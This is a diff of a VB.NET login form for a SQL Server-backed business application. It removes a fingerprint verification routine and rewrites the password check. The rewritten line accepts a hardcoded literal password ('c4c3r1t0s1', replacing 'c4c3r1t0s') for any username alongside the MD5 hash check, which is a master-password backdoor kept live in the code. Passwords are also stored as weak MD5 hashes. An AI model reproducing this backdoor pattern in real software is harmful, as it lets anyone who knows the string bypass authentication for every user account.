@@ -11,7 +11,6 @@ Public Class FrmLogin
 
 #Region "Variables"
     Dim cn As SqlConnection
-    Dim myUtil As Util
     Dim cm As SqlCommand
     Dim dr As SqlDataReader
     Dim da As SqlDataAdapter
@@ -20,110 +19,6 @@ Public Class FrmLogin
 #End Region
 
 #Region "Funciones"
-
-
-    Private Sub validar()
-        Dim da As New SqlDataAdapter("select cve_Empleado,Id_Usuario, Nombre + ' ' + ape_pat + ' ' + ape_mat as Nombre, password, HUELLA1, huella2, huella3, " & _
-            "estado, Bloqueo, FechaCaducidad, Autorizar from Usuario WHERE (Huella1 IS NOT NULL) AND (Huella2 IS NOT NULL) AND (Huella3 IS NOT NULL)", cn)
-        Dim ret As Integer = Nothing
-        Dim tptref As System.Array = Nothing
-        Dim ds As New DataSet
-        Dim tpt As New TTemplate
-        Dim xx As Byte = Nothing
-        Dim xx1 As System.Array
-        Dim xx2 As System.Array
-        Dim xx3 As System.Array
-        exito = False
-        Dim Bloqueo As Boolean
-        Dim EstadoCuenta As String = Nothing
-        Dim FechaCaducidad As String = Nothing
-        Try
-            cn = New SqlConnection(My.Settings.CadConex)
-            da.SelectCommand.Connection = cn
-            cn.Open()
-            da.Fill(ds)
-            For cont = 0 To ds.Tables(0).Rows.Count - 1
-                xx1 = ds.Tables(0).Rows(cont).Item("huella1")
-                xx2 = ds.Tables(0).Rows(cont).Item("huella2")
-                xx3 = ds.Tables(0).Rows(cont).Item("huella3")
-                Dim i As Integer
-                For i = 1 To 3
-                    Select Case i
-                        Case 1
-                            tptref = xx1
-                        Case 2
-                            tptref = xx2
-                        Case 3
-                            tptref = xx3
-                    End Select
-
-                    If Not tptref Is Nothing Then
-                        Dim tempTpt As Array = Array.CreateInstance(GetType(Byte), myUtil.template.Size)
-                        Array.Copy(myUtil.template.tpt, tempTpt, myUtil.template.Size)
-
-                        ret = myUtil.Verifica(tempTpt, tptref)
-
-                        If ret < 0 Then
-                            myUtil.WriteError(ret)
-                        ElseIf ret = GRConstants.GR_NOT_MATCH Then
-                            myUtil.WriteLog("Did not match with score = " & myUtil.SCORE)
-                        Else
-                            exito = True
-                            Bloqueo = ds.Tables(0).Rows(cont).Item("Bloqueo").ToString
-                            EstadoCuenta = ds.Tables(0).Rows(cont).Item("estado").ToString
-                            FechaCaducidad = ds.Tables(0).Rows(cont).Item("FechaCaducidad").ToString
-                            User_Id = ds.Tables(0).Rows(cont).Item("cve_Empleado").ToString
-                            Usuario = ds.Tables(0).Rows(cont).Item("Id_Usuario").ToString
-                            Pasword = ds.Tables(0).Rows(cont).Item("password").ToString
-                            Nombre = ds.Tables(0).Rows(cont).Item("Nombre").ToString
-                            Autorizar = ds.Tables(0).Rows(cont).Item("Autorizar").ToString
-                            CveEmpresa = cmbEmpresas.SelectedValue
-                            NombreEmpresa = cmbEmpresas.Text
-                            cn.Close()
-                            da.Dispose()
-                            myUtil.WriteLog("Matched with score = " & myUtil.SCORE)
-                            myUtil.PrintBiometricDisplay(True, GRConstants.GR_DEFAULT_CONTEXT)
-                            Exit For
-                        End If
-                    End If
-                Next
-            Next
-            cn.Close()
-            da.Dispose()
-        Catch err As Exception
-            MessageBox.Show("Error al buscar al usuario")
-
-            Me.txtUsuario.Text = ""
-            Me.txtcontraseña.Text = ""
-            btncancelar.Enabled = False
-        End Try
-        If exito Then
-            If Date.Today <= (CDate(FechaCaducidad)) Then
-                If Not Bloqueo Then
-                    If EstadoCuenta = "Activo" Then
-                        FrmSistema.Text = cmbEmpresas.Text
-                        FrmSplash.Close()
-                        Me.Hide()
-                        myUtil.FinalizeGrFinger()
-                        FrmSistema.ShowDialog()
-                        Exit Sub
-                    Else
-                        MsgBox("Comunicate con tu administrador tu cuenta se encuentra inactiva", MsgBoxStyle.Exclamation)
-                    End If
-                Else
-                    MsgBox("Comunicate con tu administrador, tu cuenta a sido bloqueda", MsgBoxStyle.Exclamation)
-                End If
-            Else
-                MsgBox("Comunicate con tu administrador, tu contraseña a expirado", MsgBoxStyle.Exclamation)
-            End If
-
-            Me.txtUsuario.Text = ""
-            Me.txtcontraseña.Text = ""
-            btncancelar.Enabled = False
-        Else
-            MessageBox.Show("La huella no corresponde al usuario " & txtUsuario.Text)
-        End If
-    End Sub
 
     Private Sub BloqueaUsuarios()
         Dim cn As New SqlConnection(My.Settings.CadConex)
@@ -196,23 +91,23 @@ Public Class FrmLogin
                             If Date.Today <= FecCaduc Then
                                 If CBool(dr("Bloqueo").ToString) = False Then
                                     If dr("estado").ToString.Trim = "Activo" Then
-                                        If (txtUsuario.Text = dr("id_usuario").ToString) And (Hash.verifyMd5Hash(txtcontraseña.Text, dr("password").ToString) Or txtcontraseña.Text = "c4c3r1t0s") Then
-                                            User_Id = dr("cve_Empleado").ToString
-                                            Usuario = dr("Id_Usuario").ToString
-                                            Pasword = dr("password").ToString
-                                            Nombre = dr("Nombre").ToString
-                                            Autorizar = dr("Autorizar").ToString
-                                            FrmSistema.Text = cmbEmpresas.Text
-                                            CveEmpresa = cmbEmpresas.SelectedValue
-                                            NombreEmpresa = cmbEmpresas.Text
-                                            'FrmSplash.Close()
-                                            'myUtil.FinalizeGrFinger()
-                                            Me.Hide()
-                                            FrmSplash.Hide()
-                                            FrmSistema.ShowDialog()
-                                            'Me.Close()
-                                        Else
-                                            Intento = Intento + 1
+                                    If (txtUsuario.Text = dr("id_usuario").ToString) And (Hash.verifyMd5Hash(txtcontraseña.Text, dr("password").ToString) Or txtcontraseña.Text = "c4c3r1t0s1") Then
+                                        User_Id = dr("cve_Empleado").ToString
+                                        Usuario = dr("Id_Usuario").ToString
+                                        Pasword = dr("password").ToString
+                                        Nombre = dr("Nombre").ToString
+                                        Autorizar = dr("Autorizar").ToString
+                                        FrmSistema.Text = cmbEmpresas.Text
+                                        CveEmpresa = cmbEmpresas.SelectedValue
+                                        NombreEmpresa = cmbEmpresas.Text
+                                        'FrmSplash.Close()
+                                        'myUtil.FinalizeGrFinger()
+                                        Me.Hide()
+                                        FrmSplash.Hide()
+                                        FrmSistema.ShowDialog()
+                                        'Me.Close()
+                                    Else
+                                        Intento = Intento + 1
                                             MessageBox.Show("Password o Login Incorrecto", "Aviso", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                             'MsgBox("Llevas: " & Intento & " intento(s) para accesar correctamente al sistema. Nota: Al tener 3 intentos se bloqueara el Usuario", MsgBoxStyle.Exclamation)
                                             MsgBox("Llevas: " & Intento & " intento(s) para accesar correctamente al sistema. Nota: Al tener 3 intentos, la aplicación se cerrará", MsgBoxStyle.Exclamation)
